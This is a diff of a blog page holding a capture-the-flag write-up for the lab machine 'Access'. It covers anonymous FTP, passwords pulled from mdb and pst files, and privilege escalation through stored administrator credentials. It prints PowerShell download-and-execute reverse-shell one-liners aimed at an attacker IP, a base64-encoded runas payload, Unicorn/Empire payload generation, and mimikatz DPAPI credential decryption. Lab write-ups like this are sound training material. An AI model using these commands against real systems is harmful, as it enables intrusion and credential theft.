@@ -9,6 +9,9 @@ layout: default
   <li class="">
     <a href="/">Home</a>
   </li>
+  <p>
+  This machine is showing only 3 open ports and one if it allow anonymous access in which you can find a mdb file and inside it an email with user password. Than it become more hard as it's a Windows machine but the trick is proper enumeration. Then you find that Powershell is enable and Administrator credentials are locally stored with DPAPI. 
+  </p>
 </ul>
 
     </nav>
@@ -33,7 +36,7 @@ layout: default
   </span>
   <div class="post-meta">
     <span class="post-date">
-      16 Feb 2019
+      5 March 2019
     </span>
   </div>
   <p></p>
@@ -41,124 +44,442 @@ layout: default
 						<div class="embed-container">
 							<img src="./resources/access.png" />
 						</div>
-
+</br>
 						<div class="embed-container">
 							<img src="./resources/diagram.png" />
 						</div>
 						
     <p><strong>Machine: Access<br />
-OS: Windows Server 2008 R2<br />
+OS: Windows<br />
 IP: 10.10.10.98</strong></p>
 <p>
+	<div>
+<i>nmap -sS -sC -sV -v -oA access 10.10.10.98</i>
+</div><p></p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/openports.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+We see IIS 7.5 running on port 80 so this is probably Windows 7 or corresponding Windows Server 2008 version. First check ftp service since it allows anonymous login.</br>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/ftp.png" />
+						</div>
+</p>
+<p>There are two folders</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/ftp1.png" />
+						</div>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/ftp2.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+The same for the other folder with file Access Control.zip
+</div>
+<p>
+	<i>strings backup.mdb</i>
+						<div class="embed-container">
+							<img src="./resources/mdbfile.png" />
+						</div>
+</p>
+<p>
+	or
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mdbfile2.png" />
+						</div>
+</p>
+<div>
+	<p>
+		There we get the engineer password: access4u@security. Let’s use this for the zip file
+</p>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/zipextract.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+we got a pst file
+open the file with Evolution application (default in kali; it’s a mail like outlook) and there is the security password
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/mail.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+<p>
+	log in via telnet with security and 4Cc3ssC0ntr0ller
+</p>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/telnet.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+<p>
+	Now we are as access\security on the machine and we have the user.txt file
+</p>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/user.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+Half of machine done. 
+</div>
+</br>
+<div>
+	User to root path
+A bit of enumeration
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/enum.png" />
+						</div>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/enum2.png" />
+						</div>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/enum3.png" />
+						</div>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/sqlcreds.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+Login: = sa
+Password: = htrcy@HXeryNJCTRHcnb45CJRY
+
+Not sure how that is useful because from here I got stuck and not able to use this password.
+
+</div>
+<div>					
+<p>After two hours, I started to focus on SSID found in Roaming folder</p>
+</br>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/telnet2.png" />
 						</div>
 </p>
 <div>
-text
-<i>command</i>
+Powershell is running, let’s make a reverse shell
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/nishang.png" />
 						</div>
 </p>
+</br>
 <div>
-text
-<i>command</i>
+<p>Modify it a bit so that it’s connect back to us.</p>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/nishangshell.png" />
 						</div>
 </p>
+
+</br>
 <div>
-text
-<i>command</i>
+<p><i>powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.15.162:8000/nishangshell.ps1')"</i></p>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/psshell.png" />
 						</div>
 </p>
+</br>
 <div>
-text
-<i>command</i>
+<p>Now we have a PS shell :)</p>
 </div>
 <p>
 						<div class="embed-container">
-							<img src="./resources/nmapscan.png" />
+							<img src="./resources/jaws.png" />
 						</div>
 </p>
+</br>
 <div>
-text
-<i>command</i>
+<p>JAWS is just another windows enumeration tool</p>
 </div>
 <p>
+						<div class="embed-container">
+							<img src="./resources/storedcred.png" />
+						</div>
 </p>
+</br>
+<p>
+						<div class="embed-container">
+							<img src="./resources/storedcred2.png" />
+						</div>
+</p>
+</br>
+<div>
+<p>Now we know there is administrator credentials stored locally and I’m trying to initiate a reverse shell as administrator user (using runas.exe).</br> Forthat we use the same approach</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/adminshell.png" />
+						</div>
+</p>
+</br>
+<div>
+<p>Create the separate shell with a separate port to connect
+</br>
+<i>echo -n "IEX(New-Object Net.webclient).downloadString('http://10.10.15.162:8000/adminshell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0</i>
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/psloadfile.png" />
+						</div>
+</p>
+</br>
+<div>
+<p><i>runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADEANgAyADoAOAAwADAAMAAvAGEAZABtAGkAbgBzAGgAZQBsAGwALgBwAHMAMQAnACkA"</i></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/psadminshell.png" />
+						</div>
+</p>
+</br>
+<div>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/rootflag.png" />
+						</div>
+</p>
+</br>
+<div>
+<p>Now mimikatz time!!!</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/loadmimikatz.png" />
+						</div>
+</p>
+</br>
+<div>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/loadfile.png" />
+						</div>
+</p>
+</br>
+<div>
+<p>Not able to run it from here as only access mode is allowed.</p>
+</br>
+<p>Unicorn try…not working
+<i>python unicorn.py windows/meterpreter/reverse_https 10.10.15.162 9003</i>
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/unicorn1.png" />
+						</div>
+</p>
+</br>
+<div>
+<p>Unicorn will generate two files:
+•unicorn.rc for opening msf and configuring it automatically.
+•powershell_attack.txt for copying the content on victim and executing it. It it is not
+working properly, upload it as a .bat and then execute it.
+Msfconsole –r unicorn/unicorn.rc
+Administrator is on admins group so, if we wanted to bypass UAC we just needed to use any of
+the typical methods.
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/unicorn2.png" />
+						</div>
+</p>
+</br>
+<div>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/unicorn3.png" />
+						</div>
+</p>
+</br>
+<div>
+<p><i>echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.162:8000/msf.ps1')" | iconv --to-code UTF-16LE | base64 -w 0</i></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/unicorn4.png" />
+						</div>
+</p>
+</br>
+<div>
+<p>UTF-16LE (Little Endian) as this is the default encoding schema for Windows especially for x64.</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/unicorn5.png" />
+						</div>
+</p>
+</br>
+<div>
+<p>This should have work… it does’nt..I still have no idea why CLIXML is returned…</p>
+</br>
+<p>
+	Another framework that should work is Empire.
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire1.png" />
+						</div>
+</p></br>
+<div>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire2.png" />
+						</div>
+</p></br>
+<div>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire3.png" />
+						</div>
+</p></br>
+<div>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire4.png" />
+						</div>
+</p></br>
+<div>
+<p>The result we save in a file </p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire5.png" />
+						</div>
+</p></br>
+<div>
+<p>So we got an agent that we need to execute (deploy) on the target.
+</br>
+<i>echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.162:8000/empire.ps1')" | iconv --to-code UTF-16LE | base64 -w 0</i></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire6.png" />
+						</div>
+</p></br>
+<div>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire7.png" />
+						</div>
+</p></br>
+<div>
+<p>1 the command
+</br>2 the file request transfer..automatic execute
+</br>3 result..a client connection
+</br>Back in Empire and:
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/empire8.png" />
+						</div>
+</p></br>
+<div>
+<p></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatz1.png" />
+						</div>
+</p>
+
+
+<p>X86..is not ideal so let’s migrate to a x64 process.</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatzmigrate.png" />
+						</div>
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatz2.png" />
+						</div>
+</p>
+<p><i>meterpreter > ls /users/security/appdata/Roaming/Microsoft/Protect</i></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatz3.png" />
+						</div>
+</p><p>S-1-5-21-953262931-566350628-63446256-1001 - This is the SID for the user
+</br>
+Download the content of the files so we can decrypt/analyze locally.
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatz4.png" />
+						</div>
+</p><p></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatz5.png" />
+						</div>
+</p><p>Run mimikatz on windows environment and decrypt the stored credentials with dpapi</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatz6.png" />
+						</div>
+</p><p>
+	Good reading about dpapi:
+-	https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
+-	https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi
+-	https://www.passcape.com/windows_password_recovery_dpapi_master_key
+-	https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/mimikatzcred.png" />
+						</div>
+
+</div>
+
+
+
+
+
 <div>
 I hope you enjoyed the write-up and didn't made you wasting time. Drop me a cup of coffee for Sundays (<a href="https://ko-fi.com/y2xhcmtrzw50"> https://ko-fi.com/y2xhcmtrzw50 </a>) or email me kryptoniteclark@protonmail.com 
 </div>
